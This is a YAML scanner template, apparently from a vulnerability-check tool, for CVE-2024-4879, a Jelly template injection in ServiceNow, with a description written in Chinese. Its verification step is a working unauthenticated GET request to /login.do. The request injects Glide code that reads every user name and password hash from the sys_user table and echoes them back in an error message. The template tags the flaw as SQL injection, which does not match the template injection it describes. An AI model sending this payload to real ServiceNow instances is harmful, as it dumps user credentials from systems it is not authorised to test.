app: ServiceNow
query: app:"ServiceNow"
meta:
  name: ServiceNow UI Jelly模板注入(CVE-2024-4879)
  level: 4
  tags:
  - sql_injection
  description: ServiceNow是一家提供企业级云计算服务的公司，其产品是一种基于云的服务管理解决方案，旨在帮助组织简化和自动化业务流程。其Jelly模板和Glide表达式存在注入漏洞，未经身份验证的攻击者可以通过构造恶意请求来利用这些漏洞，从而实现远程代码执行。
  homepage: ""
  author: 院长
  references: https://mp.weixin.qq.com/s/GnMCduRlCZGf20zhkrt_fg
  solution: 联系厂商
  create_at: "2024-07-29 05:18:30"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: GET
          path: /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egr=new%20GlideRecord(%22sys_user%22);gr.query();s=%22%22;while(gr.next())s=s.concat(gr.user_name,%22%20:%20%22,gr.user_password,%22%3Cbr/%3E%22);gs.addErrorMessage(s);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E
          redirect: true
          header:
          - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15
              (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
          - Accept-Encoding: gzip
          - Connection: close
          params: ""
        response:
        - name: body
          value: admin
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
